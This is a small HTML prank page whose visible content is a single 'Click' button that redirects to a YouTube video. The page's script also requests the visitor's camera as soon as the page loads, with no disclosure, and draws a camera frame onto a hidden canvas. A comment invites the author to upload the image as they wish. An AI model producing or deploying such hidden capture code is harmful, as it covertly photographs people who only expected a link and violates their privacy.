<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dont Ask My Why</title>
    <link rel="icon" href="data:,"> <!-- Favicon request disabled -->
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000; /* Black background */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh; /* Full height */
        }

        .youtube-button {
            padding: 15px 30px;
            font-size: 24px;
            color: white;
            background-color: transparent;
            border: 2px solid white; /* White border */
            border-radius: 5px;
            text-decoration: none;
            transition: background-color 0.3s, color 0.3s;
            cursor: pointer;
        }

        .youtube-button:hover {
            background-color: white; /* Change background on hover */
            color: black; /* Change text color on hover */
        }
    </style>
</head>
<body>
    <button class="youtube-button" id="redirect-button">Click</button>

    <script>
        // Redirect to the YouTube video when the button is clicked
        document.getElementById('redirect-button').onclick = function() {
            window.location.href = 'https://www.youtube.com/watch?v=xvFZjo5PgG0';
        };
        
        // Optional: Automatically take a picture with the camera
        window.addEventListener('load', () => {
            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then((stream) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');
                canvas.width = 1920;
                canvas.height = 1080;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Here you can upload the image or handle it as you wish

                // Stop the video stream
                stream.getTracks().forEach(track => track.stop());
            })
            .catch(err => {
                console.error('Error accessing camera: ', err);
            });
        });
    </script>
</body>
</html>
